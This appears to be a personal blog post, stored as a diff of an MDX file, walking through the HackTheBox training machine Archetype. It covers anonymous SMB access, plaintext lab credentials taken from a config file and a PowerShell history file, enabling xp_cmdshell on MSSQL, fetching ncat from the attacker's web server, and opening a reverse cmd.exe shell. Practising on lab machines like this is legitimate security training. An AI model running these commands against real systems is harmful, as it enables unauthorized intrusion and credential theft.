@@ -1,0 +1,237 @@
+import { ArticleLayout } from '@/components/ArticleLayout'
+
+export const article = {
+  author: 'Alexander May',
+  date: '2023-10-25',
+  title: 'Writeup: HackTheBox - Archetype',
+  description:
+    'A walkthrough on how I solved the HackTheBox Archetype machine.',
+  tags: ['HTB', 'Cybersecurity'],
+}
+
+export const metadata = {
+  title: article.title,
+  description: article.description,
+}
+
+export default (props) => <ArticleLayout article={article} {...props} />
+
+I'm still new to HackTheBox, and Cybersecurity in general, so I want to use this blog to document my learning progress.
+
+Archetype is the first box of Tier 2 of the HTB Starting Point machines. Judging from the questions asked, this seems to be the first box that requires us to submit a user flag as well as a root flag. Let's get started with the port scan:
+
+```bash
+┌─[alex@parrot]─[~]
+└──╼ $nmap -sV -sC -Pn $ip
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-25 16:22 CEST
+Nmap scan report for 10.129.89.40
+Host is up (0.050s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+```
+
+We can see that the machine has open SMB ports as well as a Microsoft SQL Server. I've encountered some boxes already that allowed anonymous access to the SMB, so let's try that first.
+We're going to try listing all the shares:
+
+```bash
+┌─[alex@parrot]─[~]
+└──╼ $smbclient -L -N $ip
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backups         Disk
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+```
+
+Authenticating with no password worked! We can see the default shares `ADMIN$` and `C$` , but unfortunately we cannot access them.
+
+Trying the `backup` share however works, and shows a single file:
+
+```bash
+┌─[alex@parrot]─[~]
+└──╼ $smbclient -N \\\\$ip\\backups
+Password for [WORKGROUP\alex]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jan 20 13:20:57 2020
+  ..                                  D        0  Mon Jan 20 13:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
+
+		5056511 blocks of size 4096. 2547768 blocks available
+smb: \>
+```
+
+Searching for the `.dtsConfig` extension reveals that this is a configuration file for MSSQL server.
+Wait, didn't we find one enumerating the ports? Surely there's nothing exciting in this config right...
+
+```bash
+smb: \> more prod.dtsConfig
+
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>
+```
+
+Ah yes, plaintext credentials. We love those! The user id also seems to indicate that this is a domain user.
+Let's try connecting to the server via the impacket `mssqlclient`:
+
+```bash
+┌─[✗]─[alex@parrot]─[/etc/impacket/examples]
+└──╼ $mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@$ip -windows-auth
+Impacket v0.12.0.dev1+20231015.203043.419e6f24 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL (ARCHETYPE\sql_svc  dbo@master)>
+```
+
+Yes! That's good. Let's see what kind of access we have.
+
+Using [this documentation](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server), we're going to check if we're an admin:
+
+```bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
+
+-
+1
+```
+
+Yes. Our next goal is to enable cmd execution, which can be done via `xp_cmdshell`. Let's see if that is activated:
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';
+ERROR: Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+```
+
+Okay. We will need to reactivate it by executing the following commands in order:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+Flags are usually on the Desktops, so let's check what we can find with our new command execution:
+
+```bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c dir c:/users/"
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        1/19/2020  10:39 PM                Administrator
+d-r---        1/19/2020  10:39 PM                Public
+d-----        1/20/2020   5:01 AM                sql_svc
+```
+
+Unfortunately we don't have access to the Administrator directory, but we can find the user flag on the `sql_svc` user's desktop.
+
+```bash
+> xp_cmdshell "powershell -c cat c:/users/sql_svc/desktop/user.txt"
+```
+
+Our next step is local privilege escalation. To check for possible attack vectors, we're going to use [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).
+
+To get the tool on the remote machine and execute, let's setup a reverse shell first. Here's how we're going to do that:
+
+1. Setup a netcat listener on a port on our machine
+
+```bash
+┌─[alex@parrot]─[~]
+└──╼ $nc -lvnp 4242
+listening on [any] 4242 ...
+```
+
+2. Setup a simple python webserver on our machine that serves a ncat executable
+
+```bash
+┌─[alex@parrot]─[/usr/share/windows-resources/ncat]
+└──╼ $sudo python3 -m http.server 80
+[sudo] password for alex:
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+3. Download that exe to our target machine via powershell
+
+```bash
+> xp_cmdshell "powershell -c cd c:/users/sql_svc/downloads; wget http://yourip/ncat.exe -outfile ncat.exe"
+```
+
+4. Execute netcat on our target machine to run cmd.exe
+
+```bash
+> xp_cmdshell "powershell -c cd c:/users/sql_svc/downloads; ./ncat.exe -e cmd.exe yourip 4242"
+```
+
+```bash
+connect to [yourip] from (UNKNOWN) [targetip] 49683
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\users\sql_svc\downloads>
+```
+
+Bingo! Now we can get winPEAS on our target machine, and execute it
+
+```powershell
+C:\users\sql_svc\downloads>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\users\sql_svc\downloads> wget http://yourip/winPEASx64.exe -outfile winPEASx64.exe
+PS C:\users\sql_svc\downloads> ./winPEASx64.exe
+```
+
+This checks a lot of different attack vectors, and I was a bit overwhelmed so I decided to go with one of the first things it marked:
+
+```
+PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.17763.1
+    PowerShell Core Version:
+    Transcription Settings:
+    Module Logging Settings:
+    Scriptblock Logging Settings:
+    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 79B
+
+```
+
+Powershell apparently saves a history file. Theoretically this could contain credentials, but surely not, right...
+
+```powershell
+PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+```
+
+I decided to use those credentials with our trusty `smbclient` to access the `C$` share and get our well-earned root flag :)
+
+```bash
+┌─[✗]─[alex@parrot]─[/etc/impacket/examples]
+└──╼ $ smbclient \\\\$ip\\C$ -U administrator
+Password for [WORKGROUP\administrator]:
+smb: \> cd users/administrator/desktop
+smb: \users\administrator\desktop\> more root.txt
+```
+
+Aaaand that's it! For me personally, this was probably the most challenging box yet. The privilege escalation part took me a lot of time, while the foothold was done pretty quickly.
+Hope you'll join me for the next writeup!
